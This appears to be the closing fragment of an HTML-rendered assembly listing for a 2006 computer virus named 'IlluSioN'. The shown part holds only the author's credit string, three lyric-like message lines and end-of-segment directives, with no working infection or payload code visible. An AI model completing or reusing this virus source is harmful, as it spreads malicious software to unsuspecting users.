</span><span class="sc5">MENSAJE</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'ÄÄ  IlluSioN  viRus coded by ThE_TaChE in México (2006)  ÄÄ '</span><span class="sc0"> 
</span><span class="sc5">MENSAJE2</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'When you know that your time is close at hand'</span><span class="sc0">
</span><span class="sc5">MENSAJE3</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'Maybe then you will begin to understand'</span><span class="sc0">
</span><span class="sc5">MENSAJE4</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'Life down there is just a strange Illusion ...'</span><span class="sc0">

</span><span class="sc5">Illusion_end</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">Illusion</span><span class="sc0">      </span><span class="sc9">ends</span><span class="sc0">
       </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">Illusion_start</span></div></body>
</html>
